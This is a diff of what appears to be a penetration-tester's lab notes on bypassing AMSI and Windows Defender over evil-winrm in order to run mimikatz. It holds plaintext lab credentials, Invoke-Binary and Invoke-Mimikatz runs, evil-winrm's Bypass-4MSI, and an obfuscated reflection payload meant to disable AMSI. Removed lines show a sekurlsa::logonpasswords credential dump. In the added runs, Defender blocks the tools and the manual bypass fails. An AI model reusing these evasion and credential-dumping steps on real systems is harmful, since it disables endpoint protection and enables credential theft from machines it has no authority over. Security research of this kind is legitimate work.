@@ -148,28 +148,31 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
--------------------------------------------------------------------------------------------------------------------------
-Example 2 - AMSI bypass with a local admin user logged on a Window server with Defender (AV) enabled and up-to-date
--------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------
+Example 2 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+---------------------------------------------------------------------------------------------------------------------------------
 
+Test with Powershell Remoting
+------------------------------
+PS C:\Users\administrator> Enter-PSSession -Computername server02.Security-Test-Lab.Local
+
+[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
+
+
+Test with Evil-WinRM
+----------------------------
 ┌──(kali㉿kali)-[~/Documents]
-└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'
+└─$ evil-winrm -u administrator -p 'Password123!' -i 192.168.1.35 -s '/home/kali/Documents/' -e '/home/kali/Documents/x64/'
 
 Evil-WinRM shell v3.3
-<SNIP>
-*Evil-WinRM* PS C:\Users\admin\Documents> menu
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
 
-   ,.   (   .      )               "            ,.   (   .      )       .   
-  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
-.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
-_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
-\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
- |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
-/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
-        \/                               \/          \/       \/         \/
-
-       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
+The term 'Menu' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Menu
 [+] Dll-Loader 
 [+] Donut-Loader 
 [+] Invoke-Binary
@@ -180,31 +183,73 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] menu
 [+] exit
 
-*Evil-WinRM* PS C:\Users\admin\Documents> Bypass-4MSI
+=> Note: Without disbaling the AMSI, mimikatz is detected and blocked by Windiws Defender...
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Binary /home/kali/Documents/x64/mimikatz.exe
+At line:1 char:1
++ Invoke-Binary TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
+At line:1 char:1
++ Invoke-Mimikatz
++ ~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+
+=> Note: Let's try the AMSI bypass feature of Evil-Winrm...
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
 [+] Success!
 
-*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz.ps1
+Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='192.168.1.35' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>
 
-*Evil-WinRM* PS C:\Users\admin\Documents> Invoke-Mimikatz
+Error: Exiting with code 1
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+Error: Exiting with code 1
 
-mimikatz(powershell) # sekurlsa::logonpasswords
 
-Authentication Id : 0 ; 42854 (00000000:0000a766)
-Session           : Interactive from 1
-User Name         : DWM-1
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 11/21/2021 6:58:31 PM
-SID               : S-1-5-90-1
-	msv :
-	 [00000003] Primary
-	 * Username : SERVER02$
-	 * Domain   : SECURITY-LAB
-<SNIP>
+=> Note: The "Bypass-4MSI" feature is not working. It is detected by Windows Defender and the WinRM connection is shutdown.
+
+
+Let's try to disable it manually vi the Evil-WinRM shell...
+
+┌──(kali㉿kali)-[~/Documents/x64]
+└─$ evil-winrm -u administrator -p 'Totoro42!' -i 192.168.1.35 -e '/home/kali/Documents/x64/' -s '/home/kali/Documents/'                                                                              1 ⨯
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $Hxl=$null;
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('MÃ¤nÃ¤g'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('AutÃ³m'+'Ã¢tÃ­on').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
+*Evil-WinRM* PS C:\Users\Administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
+*Evil-WinRM* PS C:\Users\Administrator\Documents> [Threading.Thread]::Sleep(286);
+*Evil-WinRM* PS C:\Users\Administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
+You cannot call a method on a null-valued expression.
+At line:1 char:45
++ ... .GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
+At line:1 char:1
++ Invoke-Mimikatz
++ ~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+
+=> My bypass is not working via Evil-WinRM...
